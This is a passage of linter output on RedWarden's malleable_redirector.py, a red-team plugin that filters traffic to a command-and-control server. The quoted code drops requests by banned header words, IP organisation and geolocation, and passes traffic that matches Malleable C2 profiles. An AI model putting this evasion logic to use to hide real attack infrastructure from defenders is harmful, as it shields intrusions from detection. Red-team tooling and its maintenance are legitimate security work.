    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1797:33
     |
1795 |                             )
1796 |
1797 |             except Exception as e:
     |                                 ^
1798 |                 pass
     |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1827:37
     |
1825 |   ΓÇª     if a or b or c:
1826 |   ΓÇª         self.logger.dbg(
1827 | / ΓÇª             'HTTP header name would be banned because of word "{}" but was overridden by whitelist file entries.'.format(
1828 | | ΓÇª                 kv1
1829 | | ΓÇª             )
     | |_______________^
1830 |   ΓÇª         )
1831 |   ΓÇª         whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1834:35
     |
1832 |                                   break
1833 |
1834 |                               msg = '[DROP, {}, reason:2, {}] HTTP header name contained banned word: "{}" ({}: {})'.format(
     |  ___________________________________^
1835 | |                                 ts, peerIP, kv1, kv, vv
1836 | |                             )
     | |_____________________________^
1837 |
1838 |                               if returnJson:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1871:37
     |
1869 |   ΓÇª     if a or b or c:
1870 |   ΓÇª         self.logger.dbg(
1871 | / ΓÇª             'HTTP header value would be banned because of word "{}" but was overridden by whitelist file entries.'.format(
1872 | | ΓÇª                 vv1
1873 | | ΓÇª             )
     | |_______________^
1874 |   ΓÇª         )
1875 |   ΓÇª         whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1878:35
     |
1876 |                                   break
1877 |
1878 |                               msg = '[DROP, {}, reason:3, {}] HTTP header value contained banned word: "{}" ({}: {})'.format(
     |  ___________________________________^
1879 | |                                 ts, peerIP, vv1, kv, vv
1880 | |                             )
     | |_____________________________^
1881 |
1882 |                               if returnJson:
     |
help: Convert to f-string

N806 Variable `ipLookupDetails` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1900:17
     |
1898 |         if self.proxyOptions["verify_peer_ip_details"]:
1899 |             try:
1900 |                 ipLookupDetails = self.ipLookupHelper.lookup(peerIP)
     |                 ^^^^^^^^^^^^^^^
1901 |                 whitelisted = False
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1903:17
     |
1901 |                   whitelisted = False
1902 |
1903 | /                 if ipLookupDetails and len(ipLookupDetails) > 0:
1904 | |                     if "organization" in ipLookupDetails.keys():
     | |________________________________________________________________^
1905 |                           for orgWord in ipLookupDetails["organization"]:
1906 |                               if whitelisted:
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1904:24
     |
1903 |                 if ipLookupDetails and len(ipLookupDetails) > 0:
1904 |                     if "organization" in ipLookupDetails.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1905 |                         for orgWord in ipLookupDetails["organization"]:
1906 |                             if whitelisted:
     |
help: Remove `.keys()`

N806 Variable `orgWord` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1905:29
     |
1903 |                 if ipLookupDetails and len(ipLookupDetails) > 0:
1904 |                     if "organization" in ipLookupDetails.keys():
1905 |                         for orgWord in ipLookupDetails["organization"]:
     |                             ^^^^^^^
1906 |                             if whitelisted:
1907 |                                 break
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1925:45
     |
1923 |   ΓÇª     if a or b:
1924 |   ΓÇª         self.logger.dbg(
1925 | / ΓÇª             'IP lookup organization field "{}" would be banned because of word "{}" but was overridden by whitelist file entries.'ΓÇª
1926 | | ΓÇª                 orgWord, word
1927 | | ΓÇª             )
     | |_______________^
1928 |   ΓÇª         )
1929 |   ΓÇª         whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1932:43
     |
1930 |                                           break
1931 |
1932 |                                       msg = '[DROP, {}, reason:4c, {}] peer\'s IP lookup organization field ({}) contained banned wordΓÇª
     |  ___________________________________________^
1933 | |                                         ts, peerIP, orgWord, word
1934 | |                                     )
     | |_____________________________________^
1935 |
1936 |                                       if returnJson:
     |
help: Convert to f-string

F523 `.format` call has unused arguments at position(s): 7
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1964:27
     |
1962 |               try:
1963 |                   if not self.ipGeolocationDeterminer.determine(ipLookupDetails):
1964 |                       msg = '[DROP, {}, reason:4d, {}] peer\'s IP geolocation ("{}", "{}", "{}", "{}", "{}") DID NOT met expected condΓÇª
     |  ___________________________^
1965 | |                         ts,
1966 | |                         peerIP,
1967 | |                         ipLookupDetails["continent"],
1968 | |                         ipLookupDetails["continent_code"],
1969 | |                         ipLookupDetails["country"],
1970 | |                         ipLookupDetails["country_code"],
1971 | |                         ipLookupDetails["city"],
1972 | |                         ipLookupDetails["timezone"],
1973 | |                     )
     | |_____________________^
1974 |
1975 |                       if returnJson:
     |
help: Remove extra positional arguments at position(s): 7

N806 Variable `metaAnalysis` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2001:21
     |
1999 |                 self.logger.dbg("Analysing IP Geo metadata keywords...")
2000 |                 try:
2001 |                     metaAnalysis = self.ipGeolocationDeterminer.validateIpGeoMetadata(
     |                     ^^^^^^^^^^^^
2002 |                         ipLookupDetails, BANNED_AGENTS, OVERRIDE_BANNED_AGENTS
2003 |                     )
     |

E712 Avoid equality comparisons to `False`; use `not metaAnalysis[0]:` for false checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2005:24
     |
2003 |                     )
2004 |
2005 |                     if metaAnalysis[0] == False:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^
2006 |                         a = metaAnalysis[1].lower() in OVERRIDE_BANNED_AGENTS
2007 |                         b = any(x in metaAnalysis[1] for x in OVERRIDE_BANNED_AGENTS)
     |
help: Replace with `not metaAnalysis[0]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2010:33
     |
2008 |   ΓÇª     if a or b:
2009 |   ΓÇª         self.logger.dbg(
2010 | / ΓÇª             'Peer\'s IP geolocation metadata would be banned because it contained word "{}" but was overridden by whitelist file.'ΓÇª
2011 | | ΓÇª                 metaAnalysis[1]
2012 | | ΓÇª             )
     | |_______________^
2013 |   ΓÇª         )
     |
help: Convert to f-string

F523 `.format` call has unused arguments at position(s): 8
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2016:35
     |
2015 |                           else:
2016 |                               msg = '[DROP, {}, reason:4e, {}] Peer\'s IP geolocation metadata ("{}", "{}", "{}", "{}", "{}") containeΓÇª
     |  ___________________________________^
2017 | |                                 ts,
2018 | |                                 peerIP,
2019 | |                                 ipLookupDetails["continent"],
2020 | |                                 ipLookupDetails["continent_code"],
2021 | |                                 ipLookupDetails["country"],
2022 | |                                 ipLookupDetails["country_code"],
2023 | |                                 ipLookupDetails["city"],
2024 | |                                 ipLookupDetails["timezone"],
2025 | |                                 metaAnalysis[1],
2026 | |                             )
     | |_____________________________^
2027 |
2028 |                               if returnJson:
     |
help: Remove extra positional arguments at position(s): 8

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2050:19
     |
2048 |           if returnJson:
2049 |
2050 |               msg = "[ALLOW, {}, reason:99, {}] Peer IP and HTTP headers did not contain anything suspicious.".format(
     |  ___________________^
2051 | |                 ts, peerIP
2052 | |             )
     | |_____________^
2053 |
2054 |               if not ipLookupDetails or (
     |
help: Convert to f-string

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2055:17
     |
2054 |             if not ipLookupDetails or (
2055 |                 type(ipLookupDetails) == dict and len(ipLookupDetails) == 0
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2056 |             ):
2057 |                 respJson["ipgeo"] = self.printPeerInfos(peerIP, True)
     |

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2068:36
     |
2066 |             return (False, False)
2067 |
2068 |     def processProxyPass(self, ts, peerIP, req, processNodrops):
     |                                    ^^^^^^
2069 |         if (
2070 |             self.proxyOptions["proxy_pass"] != None
     |

N803 Argument name `processNodrops` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2068:49
     |
2066 |             return (False, False)
2067 |
2068 |     def processProxyPass(self, ts, peerIP, req, processNodrops):
     |                                                 ^^^^^^^^^^^^^^
2069 |         if (
2070 |             self.proxyOptions["proxy_pass"] != None
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2070:48
     |
2068 |     def processProxyPass(self, ts, peerIP, req, processNodrops):
2069 |         if (
2070 |             self.proxyOptions["proxy_pass"] != None
     |                                                ^^^^
2071 |             and len(self.proxyOptions["proxy_pass"]) > 0
2072 |             and self.proxyOptions["policy"]["allow_proxy_pass"]
     |
help: Replace with `cond is not None`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2081:17
     |
2079 |                   opts = ""
2080 |
2081 | /                 if processNodrops:
2082 | |                     if ("options" not in entry.keys()) or (
2083 | |                         "nodrop" not in entry["options"].keys()
2084 | |                     ):
     | |______________________^
2085 |                           continue
     |
help: Combine `if` statements using `and`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2082:25
     |
2081 |                 if processNodrops:
2082 |                     if ("options" not in entry.keys()) or (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2083 |                         "nodrop" not in entry["options"].keys()
2084 |                     ):
     |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2083:25
     |
2081 |                 if processNodrops:
2082 |                     if ("options" not in entry.keys()) or (
2083 |                         "nodrop" not in entry["options"].keys()
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2084 |                     ):
2085 |                         continue
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2087:20
     |
2085 |                         continue
2086 |
2087 |                 if "nodrop" in entry["options"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2088 |                     opts += ", nodrop"
     |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2090:64
     |
2088 |                     opts += ", nodrop"
2089 |
2090 |                 if re.match("^" + url + "$", req.uri, re.I) != None:
     |                                                                ^^^^
2091 |                     self.logger.info(
2092 |                         '[ALLOW, {}, reason:0, {}]  Request conforms ProxyPass entry {} (url="{}" redir="{}"{}). Passing request to ΓÇª
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2092:25
     |
2090 |   ΓÇª     if re.match("^" + url + "$", req.uri, re.I) != None:
2091 |   ΓÇª         self.logger.info(
2092 | / ΓÇª             '[ALLOW, {}, reason:0, {}]  Request conforms ProxyPass entry {} (url="{}" redir="{}"{}). Passing request to specified ΓÇª
2093 | | ΓÇª                 ts, peerIP, num, url, host, opts
2094 | | ΓÇª             ),
     | |_______________^
2095 |   ΓÇª             color="green",
2096 |   ΓÇª         )
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2105:37
     |
2103 |                     # req.headers['Host'] = host
2104 |                     if "/" in host:
2105 |                         req.headers[proxy2_metadata_headers["override_host_header"]] = (
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2106 |                             host[: host.find("/")]
2107 |                         )
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2110:37
     |
2108 |                         req.uri = host
2109 |                     else:
2110 |                         req.headers[proxy2_metadata_headers["override_host_header"]] = (
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2111 |                             host
2112 |                         )
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2115:35
     |
2114 |                     if scheme and (scheme + "://" not in req.uri):
2115 |                         req.uri = "{}://{}".format(scheme, host)
     |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2116 |
2117 |                     raise ProxyPlugin.AlterHostHeader(host)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2121:25
     |
2119 |                   else:
2120 |                       self.logger.dbg(
2121 | /                         '(ProxyPass) Processed request with URL ("{}"...) didnt match ProxyPass entry {} URL regex: "^{}$".'.format(
2122 | |                             req.uri[:32], num, url
2123 | |                         )
     | |_________________________^
2124 |                       )
     |
help: Convert to f-string

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2127:9
     |
2126 |     def drop_check(self, req, req_body, malleable_meta):
2127 |         peerIP = ProxyPlugin.get_peer_ip(req)
     |         ^^^^^^
2128 |         ts = datetime.now().strftime("%Y-%m-%d/%H:%M:%S")
     |

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2140:9
     |
2138 |         self.processProxyPass(ts, peerIP, req, False)
2139 |
2140 |         userAgentValue = req.headers.get("User-Agent")
     |         ^^^^^^^^^^^^^^
2141 |
2142 |         fetched_uri = ""
     |

F841 Local variable `fetched_uri` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2142:9
     |
2140 |         userAgentValue = req.headers.get("User-Agent")
2141 |
2142 |         fetched_uri = ""
     |         ^^^^^^^^^^^
2143 |         fetched_host = req.headers["Host"]
     |
help: Remove assignment to unused variable `fetched_uri`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2145:30
     |
2143 |         fetched_host = req.headers["Host"]
2144 |
2145 |         if self.malleable != None:
     |                              ^^^^
2146 |             for section in MalleableParser.ProtocolTransactions:
2147 |                 found = False
     |
help: Replace with `cond is not None`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2150:20
     |
2148 |                 variant = "default"
2149 |
2150 |                 if section not in self.malleable.config.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2151 |                     continue
     |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2157:28
     |
2155 |                 for uri in MalleableParser.UriParameters:
2156 |                     for var in self.malleable.variants:
2157 |                         if var not in block.keys():
     |                            ^^^^^^^^^^^^^^^^^^^^^^^
2158 |                             continue
2159 |                         if type(block[var]) != dict:
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2159:28
     |
2157 |                         if var not in block.keys():
2158 |                             continue
2159 |                         if type(block[var]) != dict:
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^
2160 |                             continue
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2162:28
     |
2160 |                             continue
2161 |
2162 |                         if uri in block[var].keys():
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^
2163 |                             _uri = block[var][uri]
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2165:32
     |
2163 |                             _uri = block[var][uri]
2164 |
2165 |                             if type(_uri) == str:
     |                                ^^^^^^^^^^^^^^^^^
2166 |                                 found = _uri in req.uri
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2168:35
     |
2166 |                                 found = _uri in req.uri
2167 |
2168 |                             elif (type(_uri) == list or type(_uri) == tuple) and len(
     |                                   ^^^^^^^^^^^^^^^^^^
2169 |                                 _uri
2170 |                             ) > 0:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2168:57
     |
2166 |                                 found = _uri in req.uri
2167 |
2168 |                             elif (type(_uri) == list or type(_uri) == tuple) and len(
     |                                                         ^^^^^^^^^^^^^^^^^^^
2169 |                                 _uri
2170 |                             ) > 0:
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2178:33
     |
2176 |   ΓÇª                     if found:
2177 |   ΓÇª                         variant = var
2178 | / ΓÇª                         if "client" in block[var].keys():
2179 | | ΓÇª                             if "header" in block[var]["client"].keys():
     | |_________________________________________________________________________^
2180 |   ΓÇª                                 for header in block[var]["client"]["header"]:
2181 |   ΓÇª                                     k, v = header
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2178:36
     |
2176 | ΓÇª                     if found:
2177 | ΓÇª                         variant = var
2178 | ΓÇª                         if "client" in block[var].keys():
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2179 | ΓÇª                             if "header" in block[var]["client"].keys():
2180 | ΓÇª                                 for header in block[var]["client"]["header"]:
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2179:40
     |
2177 | ΓÇª                     variant = var
2178 | ΓÇª                     if "client" in block[var].keys():
2179 | ΓÇª                         if "header" in block[var]["client"].keys():
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2180 | ΓÇª                             for header in block[var]["client"]["header"]:
2181 | ΓÇª                                 k, v = header
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2194:25
     |
2192 |                     )
2193 |                     if (
2194 |                         type(malleable_meta["host"]) != str
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2195 |                         and len(malleable_meta["host"]) > 0
2196 |                     ):
     |

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2205:21
     |
2203 |                     )
2204 |
2205 |                     userAgentValue = req.headers.get("User-Agent")
     |                     ^^^^^^^^^^^^^^
2206 |
2207 |                     if ret:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2214:29
     |
2212 |                       if self.is_request:
2213 |                           self.logger.info(
2214 | /                             "== Valid malleable {} (variant: {}) request inbound.".format(
2215 | |                                 section, variant
2216 | |                             )
     | |_____________________________^
2217 |                           )
2218 |                           self.printPeerInfos(peerIP)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2226:21
     |
2224 |               ):
2225 |                   self.drop_reason(
2226 | /                     '[DROP, {}, reason:11a, {}] Requested URI does not align any of Malleable defined variants: "{}"'.format(
2227 | |                         ts, peerIP, req.uri
2228 | |                     )
     | |_____________________^
2229 |                   )
2230 |                   return self.report(True, ts, peerIP, req.uri, userAgentValue, "11a")
     |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2239:30
     |
2237 |         return self.report(False, ts, peerIP, req.uri, userAgentValue, "0")
2238 |
2239 |     def printPeerInfos(self, peerIP, returnInstead=False):
     |                              ^^^^^^
2240 |         global alreadyPrintedPeers
2241 |         try:
     |

N803 Argument name `returnInstead` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2239:38
     |
2237 |         return self.report(False, ts, peerIP, req.uri, userAgentValue, "0")
2238 |
2239 |     def printPeerInfos(self, peerIP, returnInstead=False):
     |                                      ^^^^^^^^^^^^^^^^^^^
2240 |         global alreadyPrintedPeers
2241 |         try:
     |

N806 Variable `ipLookupDetails` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2242:13
     |
2240 |         global alreadyPrintedPeers
2241 |         try:
2242 |             ipLookupDetails = self.ipLookupHelper.lookup(peerIP)
     |             ^^^^^^^^^^^^^^^
2243 |             if ipLookupDetails and len(ipLookupDetails) > 0:
2244 |                 if returnInstead:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2252:21
     |
2251 |                   printit(
2252 | /                     "Here is what we know about that address ({}): ({})".format(
2253 | |                         peerIP, ipLookupDetails
2254 | |                     ),
     | |_____________________^
2255 |                       color="grey",
2256 |                   )
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2261:29
     |
2260 |                 return ipLookupDetails
2261 |         except Exception as e:
     |                             ^
2262 |             pass
     |
help: Remove assignment to unused variable `e`

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2267:68
     |
2266 |     def _client_request_inspect(
2267 |         self, section, variant, req, req_body, malleable_meta, ts, peerIP
     |                                                                    ^^^^^^
2268 |     ):
2269 |         uri = req.uri
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2271:37
     |
2269 |         uri = req.uri
2270 |         reason = "0"
2271 |         rehdrskeys = [x.lower() for x in req.headers.keys()]
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2272 |
2273 |         if self.malleable == None:
     |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2273:30
     |
2271 |         rehdrskeys = [x.lower() for x in req.headers.keys()]
2272 |
2273 |         if self.malleable == None:
     |                              ^^^^
2274 |             self.logger.dbg(
2275 |                 "(No malleable profile) Request contents validation skipped, as there was no profile provided.",
     |
help: Replace with `cond is None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2281:13
     |
2280 |           self.logger.dbg(
2281 | /             "Deep request inspection of URI ({}) parsed as section:{}, variant:{}".format(
2282 | |                 req.uri, section, variant
2283 | |             )
     | |_____________^
2284 |           )
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2287:13
     |
2286 |         if (
2287 |             section in self.malleable.config.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2288 |             and variant in self.malleable.config[section].keys()
2289 |         ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2288:17
     |
2286 |         if (
2287 |             section in self.malleable.config.keys()
2288 |             and variant in self.malleable.config[section].keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2289 |         ):
2290 |             uris = []
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2295:20
     |
2294 |             for u in MalleableParser.UriParameters:
2295 |                 if u in configblock.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^
2296 |                     if type(configblock[u]) == str:
2297 |                         uris.append(configblock[u])
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2296:24
     |
2294 |             for u in MalleableParser.UriParameters:
2295 |                 if u in configblock.keys():
2296 |                     if type(configblock[u]) == str:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2297 |                         uris.append(configblock[u])
2298 |                     else:
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2309:20
     |
2308 |             for _block in blocks:
2309 |                 if "client" not in configblock.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2310 |                     continue
     |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2312:20
     |
2310 |                     continue
2311 |
2312 |                 if _block not in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2313 |                     # self.logger.dbg('No block {} in [{}]'.format(_block, str(configblock['client'].keys())))
2314 |                     continue
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2318:21
     |
2316 |                 foundblocks.append(_block)
2317 |                 if (
2318 |                     "uri-append" in configblock["client"][_block].keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2319 |                     or "parameter" in configblock["client"][_block].keys()
2320 |                 ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2319:24
     |
2317 |                 if (
2318 |                     "uri-append" in configblock["client"][_block].keys()
2319 |                     or "parameter" in configblock["client"][_block].keys()
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2320 |                 ):
2321 |                     exactmatch = False
     |
help: Remove `.keys()`

E712 Avoid equality comparisons to `True`; use `exactmatch:` for truth checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2324:20
     |
2323 |             for _uri in uris:
2324 |                 if exactmatch == True and uri == _uri:
     |                    ^^^^^^^^^^^^^^^^^^
2325 |                     found = True
2326 |                     if malleable_meta != None:
     |
help: Replace with `exactmatch`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2326:42
     |
2324 |                 if exactmatch == True and uri == _uri:
2325 |                     found = True
2326 |                     if malleable_meta != None:
     |                                          ^^^^
2327 |                         malleable_meta["uri"] = uri
2328 |                     break
     |
help: Replace with `cond is not None`

E712 Avoid equality comparisons to `False`; use `not exactmatch:` for false checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2329:22
     |
2327 |                         malleable_meta["uri"] = uri
2328 |                     break
2329 |                 elif exactmatch == False:
     |                      ^^^^^^^^^^^^^^^^^^^
2330 |                     if uri.startswith(_uri):
2331 |                         found = True
     |
help: Replace with `not exactmatch`

E712 Avoid equality comparisons to `True`; use `exactmatch:` for truth checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2340:28
     |
2339 |                     for _uri in uris:
2340 |                         if exactmatch == True and uri == _uri:
     |                            ^^^^^^^^^^^^^^^^^^
2341 |                             found = True
2342 |                             if malleable_meta != None:
     |
help: Replace with `exactmatch`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2342:50
     |
2340 |                         if exactmatch == True and uri == _uri:
2341 |                             found = True
2342 |                             if malleable_meta != None:
     |                                                  ^^^^
2343 |                                 malleable_meta["uri"] = uri
2344 |                             break
     |
help: Replace with `cond is not None`

E712 Avoid equality comparisons to `False`; use `not exactmatch:` for false checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2345:30
     |
2343 |                                 malleable_meta["uri"] = uri
2344 |                             break
2345 |                         elif exactmatch == False:
